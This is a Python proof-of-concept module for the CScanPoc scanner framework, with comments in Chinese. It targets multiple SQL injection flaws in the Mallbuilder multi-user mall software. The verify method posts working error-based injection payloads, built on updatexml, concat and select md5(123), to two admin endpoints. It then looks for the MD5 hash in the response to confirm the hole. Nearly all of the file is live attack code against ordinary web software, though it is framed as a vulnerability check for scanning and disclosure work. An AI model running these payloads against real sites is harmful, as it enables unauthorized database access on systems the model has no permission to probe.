# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Mallbuilder_0003'  # 平台漏洞编号，留空
    name = 'Mallbuilder多用户商城系统最新版 多处SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-28'  # 漏洞公布时间
    desc = '''
        Mallbuilder多用户商城系统最新版 多处SQL注入
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=097475'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Mallbuilder'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'df8cefc6-75b7-4190-b304-fc0df3a8ca22'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payloads = ('/?m=message&s=admin_message_list_delbox&rid=1',
                        '/?m=activity&s=admin_activity_product_list')
            for payload in payloads:
                url = '{target}'.format(target=self.target)+payload
                post_datas = ("deid[0]=1/**/or/**/1=updatexml(1,concat(0x5c,(select/**/md5(123)/**/limit/**/1)),1)&recover=1#",
                              "act=add&chk[]=1/**/or/**/1=updatexml(1,concat(0x23,(select/**/md5(123)/**/limit/**/1)),1)#")
                for post_data in post_datas:
                    req = requests.post(url, data=post_data)

                    if req.status_code == 200 and '202cb962ac59075b964b07152d234b7' in req.text:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
